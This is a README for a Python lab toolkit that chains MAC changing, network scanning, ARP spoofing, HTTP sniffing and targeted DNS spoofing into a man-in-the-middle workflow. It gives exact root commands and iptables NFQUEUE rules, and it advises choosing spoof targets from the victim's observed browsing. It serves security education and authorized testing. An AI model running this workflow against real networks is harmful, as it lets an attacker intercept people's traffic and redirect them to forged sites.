# DNS Spoofer Lab Toolkit (Scapy + NetfilterQueue)

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB)
![Scapy](https://img.shields.io/badge/Scapy-Packet%20Crafting-1f9d55)
![NetfilterQueue](https://img.shields.io/badge/NetfilterQueue-DNS%20Interception-orange)
![ARP](https://img.shields.io/badge/ARP-MITM%20Workflow-red)
![Linux](https://img.shields.io/badge/Platform-Linux-lightgrey)

A complete educational lab workflow for network interception experiments using:

- MAC address manipulation
- ARP scanning
- ARP spoofing (MITM positioning)
- HTTP traffic sniffing
- Targeted DNS response spoofing

## Disclaimer

This project is for education and authorized security testing only. You are responsible for legal and ethical use.


## Project Overview

This repository is not just individual scripts. It is a full chained workflow:

1. Change attacker MAC address.
2. Discover hosts and identify victim plus gateway.
3. ARP spoof victim and gateway to route traffic through attacker.
4. Sniff traffic to observe victim browsing behavior.
5. DNS spoof based on observed target behavior.

This sequence matters. DNS spoofing is most effective after traffic observation, because you can choose realistic target domains.

---

## Features

- Ordered red-team style lab workflow
- CLI-driven scripts for each phase
- Targeted DNS spoofing with optparse arguments
- Practical Linux packet queue integration (iptables + NFQUEUE)

---

## Workflow Architecture

```text
Attacker Machine
  Step 1: mac_changer.py
      |
      v
  Step 2: network_scanner.py  ---> identify victim + gateway
      |
      v
  Step 3: arp_spoofer.py      ---> attacker becomes MITM path
      |
      v
  Step 4: packet_sniffer.py   ---> observe victim destinations
      |
      v
  Step 5: dns_spoofer.py      ---> spoof selected domain answers
```

---

## Repository Structure

```text
dns_spoofer_with_scapy/
├── arp_spoofer.py
├── dns_spoofer.py
├── mac_changer.py
├── network_scanner.py
├── packet_sniffer.py
├── requirements.txt
└── README.md
```

---

## Requirements

### Python

- Python 3.8+

### Python Packages

Install from requirements:

```bash
pip install -r requirements.txt
```

Contents of requirements:

- scapy
- NetfilterQueue

### Linux Dependencies

These scripts rely on Linux networking tools:

- net-tools (ifconfig)
- iptables
- python3-dev
- libnetfilter-queue-dev

Ubuntu/Debian setup example:

```bash
sudo apt update
sudo apt install -y python3-pip python3-dev libnetfilter-queue-dev net-tools iptables
```

### Privileges

Most commands must run as root:

```bash
sudo python3 <script>.py ...
```

---

## Setup

1. Clone or download this repository.
2. Create and activate virtual environment.
3. Install dependencies.

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

# Complete Execution Guide 

## Step 1: Change Attacker MAC Address

Goal:
Prepare attacker identity before active network operations.

Command:

```bash
sudo python3 mac_changer.py -i eth0 -m 00:11:22:33:44:55
```

Arguments:

- -i, --interface: network interface
- -m, --mac: new MAC address

---

## Step 2: Scan Network To Identify Victim And Gateway

Goal:
Map hosts and choose:

- victim IP
- gateway IP

Command:

```bash
sudo python3 network_scanner.py -t 192.168.1.1/24
```

Argument:

- -t, --target: host/range (single IP or CIDR)

Output gives IP to MAC mapping for host selection.

---

## Step 3: ARP Spoof Victim And Gateway

Goal:
Force both victim and gateway to send traffic through attacker.

Command:

```bash
sudo python3 arp_spoofer.py -t 192.168.1.10 -g 192.168.1.1
```

Arguments:

- -t, --target: victim IP
- -g, --gateway: gateway IP

Behavior:

- Continuously sends ARP poison packets.
- On CTRL+C, attempts ARP table restoration.

---

## Step 4: Sniff Traffic To Learn Victim Behavior

Goal:
Observe what the target is visiting, then choose a domain for DNS spoofing.

Run this in a second terminal while ARP spoofing is active:

```bash
sudo python3 packet_sniffer.py -i eth0
```

Argument:

- -i, --interface: sniffing interface

Look for:

- HTTP host and path requests
- recurring domains relevant for your test scenario

---

## Step 5: DNS Spoof Based On Observed Behavior

Goal:
Intercept DNS responses and modify answers only for chosen target domains.

### 5.1 Add NFQUEUE Rule

Forward matching packets to queue 0:

```bash
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
```

Depending on your lab topology, INPUT or OUTPUT chains may be required instead.

### 5.2 Run DNS Spoofer

```bash
sudo python3 dns_spoofer.py -d www.stackoverflow.com -s 10.80.246.83 -q 0
```

Arguments:

- -d, --domain: domain to spoof
- -s, --spoof-ip: fake IP in DNS answer
- -q, --queue-num: NFQUEUE number (default 0)

How to choose domain:

- Use domains you observed in Step 4.
- Pick realistic targets based on victim behavior.

---

## Recommended Terminal Layout

Use three terminals for stable operation:

1. Terminal A: arp_spoofer.py
2. Terminal B: packet_sniffer.py
3. Terminal C: dns_spoofer.py

Keep ARP spoofing active while sniffing and DNS spoofing are running.

---

## Stop And Cleanup

1. Stop DNS spoofer (CTRL+C).
2. Stop ARP spoofer (CTRL+C) and allow restore packets.
3. Remove queue/firewall rules.

Basic cleanup command:

```bash
sudo iptables --flush
```

In real environments, remove only specific inserted rules instead of flushing all firewall rules.

---

## Troubleshooting

### Import Error: netfilterqueue

```bash
sudo apt install -y python3-dev libnetfilter-queue-dev
pip install NetfilterQueue
```

### DNS Spoof Not Triggering

- Ensure iptables rule is active and matches traffic path.
- Ensure queue number in iptables matches -q value.
- Ensure target uses plain DNS (not DoH/DoT).
- Ensure domain in -d matches observed queries.

### No Useful Sniff Output

- Verify ARP spoofing is running.
- Verify correct interface in sniffer.
- HTTPS limits payload visibility; use host-level indicators.

### MAC Address Not Changing

- Check interface name.
- Ensure ifconfig exists (net-tools installed).
- Run command as root.

---

## Script Quick Reference

### mac_changer.py

```bash
sudo python3 mac_changer.py -i <interface> -m <new_mac>
```

### network_scanner.py

```bash
sudo python3 network_scanner.py -t <ip_or_cidr>
```

### arp_spoofer.py

```bash
sudo python3 arp_spoofer.py -t <victim_ip> -g <gateway_ip>
```

### packet_sniffer.py

```bash
sudo python3 packet_sniffer.py -i <interface>
```

### dns_spoofer.py

```bash
sudo python3 dns_spoofer.py -d <domain> -s <spoof_ip> -q <queue_num>
```

---
## Legal And Ethical Notice

Use this project only on networks and devices you own or have explicit written authorization to test.

Unauthorized interception and spoofing may violate laws and policies.

---

## 👤 Author

**Sakawat Kabir Tanveer**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/s-kbr13)
[![X (Twitter)](https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/tanveer_sakawat)

---

# 📜 License

This project is licensed under the **MIT License**.

---
